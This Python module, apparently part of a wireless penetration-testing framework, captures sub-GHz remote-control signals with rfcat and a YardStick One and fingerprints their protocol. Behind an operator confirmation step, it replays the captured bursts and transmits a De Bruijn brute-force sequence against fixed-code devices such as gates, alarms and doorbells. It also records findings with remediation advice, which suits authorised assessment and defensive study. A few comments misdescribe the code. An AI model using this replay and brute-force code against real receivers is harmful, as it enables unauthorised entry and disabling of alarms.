"""
Stage 26 — rfcat Sub-GHz Capture & Replay

Uses rfcat with a YardStick One to capture sub-GHz RF signals and assess
replay vulnerability. Covers the full attack lifecycle:

  1. Capture — promiscuous OOK/FSK receive at configured frequency.
     Detects burst boundaries and groups into discrete transmissions.
  2. Protocol fingerprinting — heuristic classification of captured bursts:
       PT2262/PT2264  — 12-bit address, 4-bit data, 3:1 OOK ratio (most
                        433 MHz doorbells, alarm sensors, keyfobs)
       Rolling code   — KeeLoq/Hitag — variable length, entropy check
       Raw OOK        — unrecognised format, replayed verbatim
  3. Replay PoC (active-gated) — retransmit captured bursts. Fixed-code
     devices (PT2262 and most cheap ISM remotes) are vulnerable to trivial
     replay. Rolling code devices are flagged but not replayed.
  4. De Bruijn brute force (active-gated, fixed-code only) — generate a
     De Bruijn B(2,n) sequence covering all n-bit codes and replay as a
     single continuous burst. For PT2262 with n=12, covers all 4096 codes
     in ~2 seconds of on-air time.

Hardware: YardStick One
Library:  rfcat (pip install rfcat)
"""

from __future__ import annotations

import time
from typing import Iterator

from core.models import Finding
from core.db import insert_finding
from core.logger import get_logger, active_gate
from core.vulndb import match_subghz, VulnMatch
import config

log = get_logger("s26_subghz_cap")

# Burst detection: consecutive silence longer than this → new burst boundary.
_BURST_GAP_BYTES = 4    # rfcat returns blocks; gap = repeated zero/idle bytes

# Minimum burst length to consider (filter noise)
_BURST_MIN_BYTES = 4

# Maximum bursts to capture and store (avoid memory bloat)
_MAX_BURSTS = 50

# PT2262 heuristic: typical payload length (bytes after OOK demodulation)
# 12-bit address + 4-bit data = 4 bytes (with tri-state encoding overhead ~8 bytes)
_PT2262_PAYLOAD_MIN = 4
_PT2262_PAYLOAD_MAX = 16

# Rolling code heuristic: payloads longer than this with high entropy
_ROLLING_CODE_MIN_BYTES = 8
_HIGH_ENTROPY_THRESHOLD = 3.5   # bits per byte (Shannon entropy estimate)


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

def run(dongle: object, engagement_id: str) -> None:
    """Capture sub-GHz bursts and assess replay vulnerability.

    Args:
        dongle: YardStick One WHAD dongle (interface name used for logging;
                rfcat opens independently via USB).
        engagement_id: Engagement ID for Finding storage.
    """
    try:
        from rflib import RFCat
    except ImportError:
        log.warning(
            "[S26] rfcat not installed — sub-GHz capture stage skipped. "
            "Install with: pip install rfcat"
        )
        return

    freq_mhz  = config.SUBGHZ_CAP_FREQ_MHZ
    cap_secs  = config.SUBGHZ_CAP_SECS
    modulation = config.SUBGHZ_CAP_MODULATION
    baud      = config.SUBGHZ_CAP_BAUD
    auto_baud = config.SUBGHZ_CAP_BAUD_PROBE

    log.info(
        f"[S26] Sub-GHz capture: {freq_mhz} MHz, {modulation}, "
        f"baud={baud if not auto_baud else 'auto'}, {cap_secs}s"
    )

    try:
        d = RFCat(idx=0)
    except Exception as exc:
        log.warning(f"[S26] Failed to open rfcat device: {exc}")
        return

    try:
        _configure_radio(d, freq_mhz, modulation, baud)

        if auto_baud:
            baud = _probe_baud(d, freq_mhz) or baud
            log.info(f"[S26] Baud rate selected: {baud}")
            _configure_radio(d, freq_mhz, modulation, baud)

        log.info(f"[S26] Capturing for {cap_secs}s at {freq_mhz} MHz ...")
        bursts = list(_capture_bursts(d, cap_secs))

    finally:
        try:
            d.setModeIDLE()
        except Exception:
            pass

    if not bursts:
        log.info(f"[S26] No RF bursts captured at {freq_mhz} MHz.")
        _print_summary(freq_mhz, [], False)
        return

    log.info(f"[S26] {len(bursts)} burst(s) captured.")

    # Protocol fingerprint
    proto, is_fixed = _fingerprint(bursts)
    log.info(f"[S26] Protocol fingerprint: {proto} (fixed_code={is_fixed})")

    # Findings
    _emit_finding(freq_mhz, bursts, proto, is_fixed, engagement_id)

    # CVE matching based on protocol fingerprint
    cve_matches = match_subghz(fixed_code=is_fixed, protocol=proto)
    for vm in cve_matches:
        cve_finding = Finding(
            type="cve_match",
            severity=vm.severity,
            target_addr=f"{freq_mhz} MHz",
            description=f"{vm.cve + ': ' if vm.cve else ''}{vm.name} — {vm.summary}",
            remediation=vm.remediation,
            evidence={
                "cve": vm.cve,
                "vuln_name": vm.name,
                "tags": list(vm.tags),
                "references": list(vm.references),
                "frequency_mhz": freq_mhz,
                "protocol": proto,
                "is_fixed_code": is_fixed,
            },
            engagement_id=engagement_id,
        )
        insert_finding(cve_finding)
        log.info(f"FINDING [{vm.severity}] cve_match: {vm.cve or vm.name} ({proto})")

    _print_summary(freq_mhz, bursts, is_fixed)

    if not is_fixed:
        log.info(
            f"[S26] Rolling-code protocol detected ({proto}). "
            "Replay not attempted — rolling codes are not directly replayable. "
            "Stage 27 (RollJam) would be needed for rolling-code attacks (2× YS1 required)."
        )
        return

    # Replay PoC (active-gated)
    if not active_gate(26, f"Replay captured {proto} burst(s) at {freq_mhz} MHz?"):
        log.info("[S26] Replay skipped (active-gate declined).")
        return

    try:
        d2 = RFCat(idx=0)
    except Exception as exc:
        log.warning(f"[S26] Failed to re-open rfcat for TX: {exc}")
        return

    try:
        _configure_radio(d2, freq_mhz, modulation, baud)
        _replay_bursts(d2, bursts, freq_mhz)
    finally:
        try:
            d2.setModeIDLE()
        except Exception:
            pass

    # De Bruijn brute-force (active-gated, fixed-code only)
    if proto == "PT2262" and active_gate(
        26,
        f"Run De Bruijn brute-force? (covers all {2 ** config.SUBGHZ_BF_BITS} "
        f"{config.SUBGHZ_BF_BITS}-bit codes in one transmission)",
    ):
        try:
            d3 = RFCat(idx=0)
        except Exception as exc:
            log.warning(f"[S26] Failed to re-open rfcat for brute force: {exc}")
            return
        try:
            _configure_radio(d3, freq_mhz, modulation, baud)
            _debruijn_bruteforce(d3, freq_mhz, baud)
        finally:
            try:
                d3.setModeIDLE()
            except Exception:
                pass


# ---------------------------------------------------------------------------
# Radio configuration
# ---------------------------------------------------------------------------

def _configure_radio(d: object, freq_mhz: int, modulation: str, baud: int) -> None:
    """Configure rfcat radio for receive/transmit."""
    mod_code = {
        "ASK_OOK": 0x30,
        "GFSK":    0x10,
        "2FSK":    0x00,
        "MSK":     0x70,
    }.get(modulation.upper(), 0x30)

    d.setFreq(freq_mhz * 1_000_000)
    d.setMdmModulation(mod_code)
    d.setMdmDRate(baud)
    d.setMdmSyncMode(0)        # no sync word — capture everything
    d.setEnablePktCRC(False)
    d.setPktPQT(0)
    d.setMaxPower()


# ---------------------------------------------------------------------------
# Baud rate auto-detection
# ---------------------------------------------------------------------------

def _probe_baud(d: object, freq_mhz: int) -> int | None:
    """Heuristic baud detection: try common rates, pick the one yielding
    the most consistent burst timing.

    Returns the best-fit baud rate, or None to keep the configured value.
    """
    candidates = [1200, 2400, 4800, 9600, 19200, 38400]
    best_baud: int | None = None
    best_score = 0

    for baud in candidates:
        _configure_radio(d, freq_mhz, "ASK_OOK", baud)
        hits = 0
        deadline = time.monotonic() + 0.5
        while time.monotonic() < deadline:
            try:
                chunk, _ = d.RFrecv(blocksize=64, timeout=100)
                if chunk and any(b != 0 for b in chunk):
                    hits += 1
            except Exception:
                break
        if hits > best_score:
            best_score = hits
            best_baud = baud

    if best_baud and best_score > 0:
        log.debug(f"[S26] Auto-baud: {best_baud} bps scored {best_score} hits")
        return best_baud
    return None


# ---------------------------------------------------------------------------
# Burst capture
# ---------------------------------------------------------------------------

def _capture_bursts(d: object, duration_s: float) -> Iterator[bytes]:
    """Capture discrete RF bursts from an rfcat device.

    Groups consecutive non-idle blocks into burst frames. Yields each
    burst as a bytes object. Stops after duration_s seconds.
    """
    deadline   = time.monotonic() + duration_s
    current    = bytearray()
    idle_count = 0
    yielded    = 0

    while time.monotonic() < deadline:
        if yielded >= _MAX_BURSTS:
            log.debug(f"[S26] Burst cap ({_MAX_BURSTS}) reached.")
            break
        try:
            chunk, _ = d.RFrecv(blocksize=128, timeout=200)
        except Exception as exc:
            err = str(exc).lower()
            if "timeout" in err or "chip" in err:
                time.sleep(0.02)
                continue
            log.debug(f"[S26] RFrecv: {exc}")
            break

        if not chunk:
            continue

        is_idle = all(b == 0 for b in chunk)
        if is_idle:
            idle_count += 1
            if idle_count >= _BURST_GAP_BYTES and current:
                burst = bytes(current)
                if len(burst) >= _BURST_MIN_BYTES:
                    yield burst
                    yielded += 1
                current.clear()
                idle_count = 0
        else:
            idle_count = 0
            current.extend(chunk)

    # Flush any trailing burst
    if current and len(current) >= _BURST_MIN_BYTES:
        yield bytes(current)


# ---------------------------------------------------------------------------
# Protocol fingerprinting
# ---------------------------------------------------------------------------

def _fingerprint(bursts: list[bytes]) -> tuple[str, bool]:
    """Classify bursts as a known protocol. Returns (protocol_name, is_fixed_code).

    Heuristics (conservative — err toward "unknown" rather than false positive):
      PT2262: most bursts 4–16 bytes, consistent length, OOK 3:1 run-length ratio
      Rolling: long bursts (>8 bytes), high Shannon entropy → probably encrypted
      Raw OOK: short, consistent-length, low entropy → replay-safe to attempt
    """
    if not bursts:
        return "unknown", False

    lengths  = [len(b) for b in bursts]
    avg_len  = sum(lengths) / len(lengths)
    max_len  = max(lengths)
    min_len  = min(lengths)
    variance = sum((l - avg_len) ** 2 for l in lengths) / len(lengths)

    # Consistent length ± 2 bytes → likely fixed-frame protocol
    consistent = (max_len - min_len) <= 4

    entropies = [_byte_entropy(b) for b in bursts]
    avg_entropy = sum(entropies) / len(entropies)

    log.debug(
        f"[S26] Fingerprint: bursts={len(bursts)} avg_len={avg_len:.1f} "
        f"len_variance={variance:.1f} avg_entropy={avg_entropy:.2f}"
    )

    if consistent and _PT2262_PAYLOAD_MIN <= avg_len <= _PT2262_PAYLOAD_MAX:
        return "PT2262", True

    if avg_len >= _ROLLING_CODE_MIN_BYTES and avg_entropy >= _HIGH_ENTROPY_THRESHOLD:
        return "rolling-code", False

    if consistent and avg_entropy < _HIGH_ENTROPY_THRESHOLD:
        return "fixed-code OOK", True

    return "unknown OOK", True  # default: attempt replay


def _byte_entropy(data: bytes) -> float:
    """Shannon entropy in bits per byte."""
    if not data:
        return 0.0
    from collections import Counter
    import math
    counts = Counter(data)
    total  = len(data)
    return -sum(
        (c / total) * math.log2(c / total)
        for c in counts.values()
        if c > 0
    )


# ---------------------------------------------------------------------------
# Replay
# ---------------------------------------------------------------------------

def _replay_bursts(d: object, bursts: list[bytes], freq_mhz: int) -> None:
    """Retransmit each captured burst `SUBGHZ_REPLAY_REPEAT` times."""
    repeat = config.SUBGHZ_REPLAY_REPEAT
    log.info(
        f"[S26] Replaying {len(bursts)} burst(s) at {freq_mhz} MHz "
        f"× {repeat} repetitions ..."
    )
    gap = config.SUBGHZ_BF_GAP_MS / 1000.0

    for i, burst in enumerate(bursts):
        for _ in range(repeat):
            try:
                d.RFxmit(burst, repeat=0)
            except Exception as exc:
                log.debug(f"[S26] RFxmit burst {i}: {exc}")
                break
            time.sleep(0.02)
        time.sleep(gap)
        log.info(f"[S26] Burst {i + 1}/{len(bursts)} replayed ({len(burst)} bytes).")


# ---------------------------------------------------------------------------
# De Bruijn brute-force
# ---------------------------------------------------------------------------

def _debruijn_bruteforce(d: object, freq_mhz: int, baud: int) -> None:
    """Transmit a De Bruijn B(2,n) sequence covering all n-bit OOK codes.

    For a B(2,12) sequence of length 2^12 = 4096 bits, every possible
    12-bit code appears as a contiguous window exactly once. Encoded as
    OOK at `baud` bps this covers all PT2262 codes in one RF burst.
    """
    bits    = config.SUBGHZ_BF_BITS
    gap_ms  = config.SUBGHZ_BF_GAP_MS

    log.info(
        f"[S26] De Bruijn B(2,{bits}) brute-force at {freq_mhz} MHz "
        f"— covering all {2 ** bits} codes ..."
    )

    db_seq = _debruijn_sequence(2, bits)
    # Pack bit sequence to bytes (MSB first per byte)
    payload = _bits_to_bytes(db_seq)

    try:
        d.RFxmit(payload, repeat=0)
        time.sleep(gap_ms / 1000.0)
        log.info(
            f"[S26] De Bruijn burst transmitted: "
            f"{len(payload)} bytes, {len(db_seq)} bits"
        )
    except Exception as exc:
        log.warning(f"[S26] De Bruijn TX error: {exc}")


def _debruijn_sequence(k: int, n: int) -> list[int]:
    """Generate a De Bruijn B(k,n) sequence (Martin / van Aardenne-Ehrenfest).

    Returns a list of integers in [0, k) forming the minimal sequence
    where every n-tuple over alphabet [0,k) appears as a cyclic substring.
    """
    # Martin's algorithm (non-recursive)
    alphabet = list(range(k))
    a = [0] * k * n
    sequence: list[int] = []

    def db(t: int, p: int) -> None:
        if t > n:
            if n % p == 0:
                sequence.extend(a[1: p + 1])
        else:
            a[t] = a[t - p]
            db(t + 1, p)
            for j in alphabet[a[t - p] + 1:]:
                a[t] = j
                db(t + 1, t)

    db(1, 1)
    return sequence


def _bits_to_bytes(bits: list[int]) -> bytes:
    """Pack a list of 0/1 integers into bytes (MSB first)."""
    # Pad to multiple of 8
    padded = bits + [0] * (-len(bits) % 8)
    out = bytearray()
    for i in range(0, len(padded), 8):
        byte = 0
        for b in padded[i: i + 8]:
            byte = (byte << 1) | (b & 1)
        out.append(byte)
    return bytes(out)


# ---------------------------------------------------------------------------
# Findings
# ---------------------------------------------------------------------------

def _emit_finding(
    freq_mhz: int,
    bursts: list[bytes],
    proto: str,
    is_fixed: bool,
    engagement_id: str,
) -> None:
    if is_fixed:
        severity = "high"
        desc = (
            f"{proto} fixed-code RF signal captured at {freq_mhz} MHz. "
            f"{len(bursts)} burst(s) recorded. "
            "Fixed-code OOK remotes are trivially replayable — "
            "an attacker who records one transmission can replay it indefinitely "
            "to trigger the associated action (gate open, alarm disable, doorbell)."
        )
        remediation = (
            "Replace fixed-code RF devices with rolling-code (KeeLoq, AES-CMAC) "
            "or challenge-response equivalents. "
            "For alarm systems, use a wired zone or 868 MHz encrypted sensor. "
            "Confirm that the RF receiver validates freshness (replay counter)."
        )
    else:
        severity = "medium"
        desc = (
            f"Rolling-code RF signal captured at {freq_mhz} MHz (protocol: {proto}). "
            f"{len(bursts)} burst(s) recorded. "
            "Rolling codes are not directly replayable without a simultaneous "
            "jamming+capture attack (requires 2× YardStick One)."
        )
        remediation = (
            "Rolling code provides replay protection. Verify the implementation "
            "enforces a strict counter window (≤2 codes ahead). "
            "KeeLoq is cryptographically weak — replace with AES-based systems "
            "where feasible."
        )

    finding = Finding(
        type="subghz_capture_replay",
        severity=severity,
        target_addr=f"{freq_mhz} MHz",
        description=desc,
        remediation=remediation,
        evidence={
            "frequency_mhz": freq_mhz,
            "protocol":      proto,
            "is_fixed_code": is_fixed,
            "bursts_captured": len(bursts),
            "burst_lengths":   [len(b) for b in bursts[:10]],  # first 10 only
        },
        engagement_id=engagement_id,
    )
    insert_finding(finding)
    log.info(f"FINDING [{severity}] subghz_capture_replay: {freq_mhz} MHz {proto}")


# ---------------------------------------------------------------------------
# Summary
# ---------------------------------------------------------------------------

def _print_summary(freq_mhz: int, bursts: list[bytes], is_fixed: bool) -> None:
    log.info("\n" + "─" * 76)
    log.info("  STAGE 26 SUMMARY -- Sub-GHz Capture & Replay (rfcat)")
    log.info("─" * 76)
    log.info(f"  {'Frequency':<28}: {freq_mhz} MHz")
    log.info(f"  {'Bursts captured':<28}: {len(bursts)}")
    if bursts:
        lengths = [len(b) for b in bursts]
        log.info(
            f"  {'Burst sizes (bytes)':<28}: "
            f"min={min(lengths)} max={max(lengths)} "
            f"avg={sum(lengths)//len(lengths)}"
        )
    log.info(f"  {'Fixed-code (replayable)':<28}: {is_fixed}")
    if not bursts:
        log.info("  Result: no RF bursts captured at configured frequency.")
    log.info("─" * 76 + "\n")
